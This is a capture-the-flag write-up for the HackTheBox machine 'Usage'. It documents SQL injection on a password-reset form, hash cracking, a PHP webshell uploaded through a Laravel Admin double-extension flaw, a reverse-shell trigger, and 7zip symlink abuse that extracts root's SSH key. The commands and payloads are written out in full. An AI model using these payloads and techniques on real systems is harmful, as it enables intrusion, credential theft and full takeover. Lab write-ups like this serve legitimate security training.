# Usage — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Usage |
| OS | Linux (Ubuntu 22.04) |
| Difficulty | Easy |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.79.46` |
| Domain | `usage.htb`, `admin.usage.htb` |
| Tools Used | Nmap, Gobuster, Burp Suite, sqlmap, john, curl, nc |
| CVEs | CVE-2023-24249 (encore/laravel-admin 1.8.18 arbitrary file upload) |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Foothold — SQLi → Hash Crack → Laravel Admin File Upload RCE](#foothold--sqli--hash-crack--laravel-admin-file-upload-rce)
- [Lateral Movement — Plaintext Credentials in .monitrc](#lateral-movement--plaintext-credentials-in-monitrc)
- [Privilege Escalation — 7zip Symlink Abuse via usage\_management](#privilege-escalation--7zip-symlink-abuse-via-usage_management)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap two-phase scan | Ports 22 (SSH) and 80 (nginx) open; redirect to `usage.htb` |
| 2 | vHost registration + web recon | `admin.usage.htb` subdomain discovered; two login panels identified |
| 3 | Account registration + boolean SQLi probe on `/forget-password` | `test' or 1=1;-- -` returns valid response — injection confirmed |
| 4 | SQLmap (`--level 3`) on saved POST request | Boolean-blind + time-based SQLi found; database `usage_blog` enumerated |
| 5 | SQLmap `--dump` on `admin_users` table | bcrypt hash for `admin` recovered |
| 6 | `john` hash crack with `rockyou.txt` | Password `whatever1` cracked in seconds |
| 7 | Login to `admin.usage.htb` as `admin:whatever1` | Laravel Admin panel — `encore/laravel-admin 1.8.18` identified (CVE-2023-24249) |
| 8 | PHP webshell uploaded as `.jpg`, renamed to `.jpg.php` via Burp intercept | Webshell accessible at `/uploads/images/shell.jpg.php` |
| 9 | Base64-encoded reverse shell triggered via webshell | Reverse shell as `dash` |
| 10 | `cat ~/.monitrc` | Plaintext password `3nc0d3d_pa$$w0rd` found for monit admin |
| 11 | `su xander` with recovered password | Lateral movement to `xander` account |
| 12 | `sudo -l` as `xander` → `(ALL) NOPASSWD: /usr/bin/usage_management` | Custom binary with 7zip backup function identified |
| 13 | `strings /usr/bin/usage_management` | 7zip command uses `-snl` flag and `-- *` glob in `/var/www/html` |
| 14 | Create `@id_rsa` file + symlink `id_rsa → /root/.ssh/id_rsa` in `/var/www/html` | 7zip reads symlink as a filelist and outputs root's private SSH key |
| 15 | SSH as `root` using extracted private key | Full system compromise |

---

## Reconnaissance

### Nmap — Two-Phase Scan

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.79.46 \
  | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
Hackerpatel007_1@htb[/htb]$ nmap -p$ports -sC -sV 10.129.79.46
```

```
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu
80/tcp open  http  nginx 1.18.0 → redirect to usage.htb
```

```bash
Hackerpatel007_1@htb[/htb]$ echo 10.129.79.46 usage.htb admin.usage.htb | sudo tee -a /etc/hosts
```

---

## Foothold — SQLi → Hash Crack → Laravel Admin File Upload RCE

### Step 1 — Boolean SQLi on /forget-password

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST http://usage.htb/forget-password \
  -d "_token=<csrf>&email=test' or 1=1;-- -"
# → "We have e-mailed your password reset link..."
```

SQL injection confirmed. Capture POST request in Burp → save as `reset.req`.

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -r reset.req -p email --batch --level 3
# → boolean-blind + time-based, MySQL backend

Hackerpatel007_1@htb[/htb]$ sqlmap -r reset.req -p email --batch --level 3 \
  -D usage_blog -T admin_users --dump
```

```
admin | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
```

```bash
Hackerpatel007_1@htb[/htb]$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
# → whatever1
```

### Step 2 — CVE-2023-24249 Laravel Admin File Upload RCE

Login to `admin.usage.htb` as `admin:whatever1` — `encore/laravel-admin 1.8.18` confirmed.

```bash
Hackerpatel007_1@htb[/htb]$ echo '<?php system($_GET["melo"]); ?>' > shell.php
Hackerpatel007_1@htb[/htb]$ mv shell.php shell.jpg
```

Upload to `/admin/auth/setting` avatar → Burp intercept → change `filename="shell.jpg.php"`

```
http://admin.usage.htb/uploads/images/shell.jpg.php?melo=id
# → uid=1000(dash)
```

```bash
Hackerpatel007_1@htb[/htb]$ nc -nlvp 4444
# trigger: ?melo=echo+<b64_revshell>+|+base64+-d+|+bash
dash@usage:~$ cat user.txt
813431468129817ff5e775ac6dfae264
```

---

## Lateral Movement — Plaintext Credentials in .monitrc

```bash
dash@usage:~$ cat ~/.monitrc
# → allow admin:3nc0d3d_pa$$w0rd

dash@usage:~$ su xander
Password: 3nc0d3d_pa$$w0rd
# → credential reuse confirmed
```

---

## Privilege Escalation — 7zip Symlink Abuse via usage_management

```bash
xander@usage:~$ sudo -l
# → (ALL : ALL) NOPASSWD: /usr/bin/usage_management

xander@usage:~$ strings /usr/bin/usage_management
# → /var/www/html
# → /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

`-snl` stores symlinks as links. But filenames starting with `@` are treated as **listfiles** by 7zip — this bypasses `-snl` entirely.

```bash
xander@usage:~$ cd /var/www/html
xander@usage:/var/www/html$ touch @id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
# → option 1 (Project Backup)
# → -----BEGIN OPENSSH PRIVATE KEY----- : No more files
# → <key lines> : No more files
# → -----END OPENSSH PRIVATE KEY----- : No more files
```

Strip `: No more files` from each line, save as `root_id_rsa`, `chmod 600`:

```bash
Hackerpatel007_1@htb[/htb]$ ssh -i root_id_rsa root@usage.htb
root@usage:~# cat /root/root.txt
0128aafe64e342a0f062015cd95be129
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `813431468129817ff5e775ac6dfae264` |
| Root Flag | `0128aafe64e342a0f062015cd95be129` |

---

## Lessons Learned

1. Password reset forms are high-value SQLi targets — binary yes/no responses are exactly what boolean-blind injection needs.
2. `--level 3` in sqlmap expands test payloads — the default level missed this injection.
3. The Laravel Admin dashboard shows the installed package version — always check it against CVEs after gaining admin access.
4. `.jpg.php` double extension bypass: the upload filter saw `.jpg` and accepted; PHP-FPM saw `.php` and executed.
5. Never store plaintext credentials in config files. Always `cat` every dotfile after gaining shell.
6. 7zip `@listfile` feature: `@id_rsa` causes 7zip to open `id_rsa` as a filelist input — `-snl` only governs archive entries, not listfile processing.
7. `strings` on an unknown binary is always the first static analysis step.

---

## Full Attack Chain Reference

```
Nmap → ports 22, 80 (nginx → usage.htb)
/etc/hosts → usage.htb, admin.usage.htb
/forget-password: test' or 1=1;-- - → SQLi confirmed
sqlmap --level 3 → boolean-blind + time-based
sqlmap dump admin_users → bcrypt hash
john → whatever1
admin.usage.htb admin:whatever1 → Laravel Admin 1.8.18 (CVE-2023-24249)
shell.jpg → Burp → shell.jpg.php → RCE as dash
cat ~/.monitrc → 3nc0d3d_pa$$w0rd → su xander
sudo -l → usage_management NOPASSWD
strings → 7za from /var/www/html with -- *
touch @id_rsa && ln -s /root/.ssh/id_rsa id_rsa
sudo usage_management option 1 → key printed as errors
SSH as root → 0128aafe64e342a0f062015cd95be129
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sqlmap -r reset.req -p email --batch --level 3` | SQLi with expanded payloads |
| `john hash --wordlist=rockyou.txt` | Crack bcrypt hash |
| Burp intercept → `filename="shell.jpg.php"` | Double extension bypass |
| `cat ~/.monitrc` | Plaintext credentials in Monit config |
| `strings /usr/bin/usage_management` | Static analysis — reveals 7zip command |
| `touch @id_rsa && ln -s /root/.ssh/id_rsa id_rsa` | 7zip listfile + symlink setup |
| `sudo /usr/bin/usage_management` option 1 | Trigger key leak via 7zip listfile abuse |
| `ssh -i root_id_rsa root@usage.htb` | SSH as root with extracted key |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1595 | T1595.001 | Nmap two-phase scan |
| T1190 | — | Boolean-blind SQLi on /forget-password |
| T1110 | T1110.002 | John bcrypt crack |
| T1078 | T1078.003 | Admin panel access with cracked credentials |
| T1190 | — | CVE-2023-24249 .jpg.php upload RCE |
| T1505 | T1505.003 | PHP webshell deployed via avatar upload |
| T1552 | T1552.001 | Plaintext credentials in ~/.monitrc |
| T1548 | T1548.003 | xander NOPASSWD: usage_management |
| T1574 | T1574.005 | 7zip @listfile symlink → root SSH key |
| T1552 | T1552.004 | Root OpenSSH private key extracted |

*HackTheBox retired machine — writeup published after official retirement.*
*Penetration Tester role in India | Target: January 2027*
